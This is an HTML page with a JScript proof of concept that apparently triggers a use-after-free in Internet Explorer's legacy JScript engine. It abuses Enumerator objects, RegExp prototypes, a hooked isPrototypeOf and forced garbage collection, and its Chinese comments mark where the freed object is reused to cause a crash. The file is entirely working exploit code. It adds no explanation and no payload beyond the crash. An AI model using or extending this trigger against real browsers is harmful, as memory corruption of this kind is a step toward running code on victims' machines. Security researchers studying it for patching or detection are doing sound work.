<meta http-equiv="X-UA-Compatible" content="IE=8"></meta>
<html>
<script language="Jscript.Encode">
var objs = new Array();
var refs = new Array();
var dummyObj = new Object();
     
function uaf() {
    // this 未被 GC 追踪
    for (var i = 0; i < 10000; i++) {
        objs[i] = null;
    }
 
    CollectGarbage();
 
    for (var i = 0; i < 201; i++) {
        refs[i].prototype = null;
    }
 
    CollectGarbage();
    alert(this); // <- 触发 crash
    return true;
}
 
for (var i = 0; i < 201; i++) {
    var arr = new Array({ prototype: {} });
    var e = new Enumerator(arr);
    refs[i] = e.item();
}
 
for (var i = 0; i < 201; i++) {
    refs[i].prototype = new RegExp();
    refs[i].prototype.isPrototypeOf = uaf;
}
 
for (var i = 0; i < 10000; i++) {
    objs[i] = new Object();
}
 
dummyObj instanceof refs[200];
</script>
</html>